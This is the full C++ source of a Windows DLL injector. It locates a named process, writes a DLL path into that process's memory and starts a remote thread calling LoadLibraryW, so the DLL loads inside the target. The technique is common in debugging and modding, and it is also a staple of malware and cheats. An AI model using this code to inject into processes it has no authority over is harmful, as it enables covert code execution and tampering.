#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <filesystem>

// Function to print error messages
void PrintError(const std::wstring& msg) {
    std::wcerr << L"[Error] " << msg << L" (Error code: " << GetLastError() << L")\n";
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        std::wcerr << L"Usage: Injector.exe <ProcessName> <DLLName>\n";
        system("pause");
        return 1;
    }

    // Extract process name and DLL name from arguments
    std::wstring processName = argv[1];
    std::wstring dllName = argv[2];

    // Check if the DLL exists in the same directory as the EXE
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring exeDirectory = std::filesystem::path(exePath).parent_path().wstring();
    std::wstring dllPath = exeDirectory + L"\\" + dllName;

    if (!std::filesystem::exists(dllPath)) {
        PrintError(L"The specified DLL file was not found in the EXE directory");
        return 1;
    }

    // Find the target process
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        PrintError(L"Failed to create a snapshot of processes");
        return 1;
    }

    PROCESSENTRY32W pe32 = { 0 };
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    DWORD processID = 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);

    if (processID == 0) {
        PrintError(L"The specified process was not found");
        return 1;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        PrintError(L"Failed to open the target process");
        return 1;
    }

    // Allocate memory in the target process
    void* allocMem = VirtualAllocEx(hProcess, nullptr, dllPath.size() * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!allocMem) {
        PrintError(L"Failed to allocate memory in the target process");
        CloseHandle(hProcess);
        return 1;
    }

    // Write the DLL path into the allocated memory
    if (!WriteProcessMemory(hProcess, allocMem, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), nullptr)) {
        PrintError(L"Failed to write the DLL path into the target process");
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Get the address of LoadLibraryW in kernel32.dll
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    if (!hKernel32) {
        PrintError(L"Failed to get the handle of kernel32.dll");
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    FARPROC loadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryW");
    if (!loadLibraryAddr) {
        PrintError(L"Failed to get the address of LoadLibraryW");
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread to call LoadLibraryW in the target process
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, allocMem, 0, nullptr);
    if (!hThread) {
        PrintError(L"Failed to create a remote thread in the target process");
        VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[Success] DLL injected successfully!\n";

    // Wait for the thread to finish and clean up
    WaitForSingleObject(hThread, INFINITE);
    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
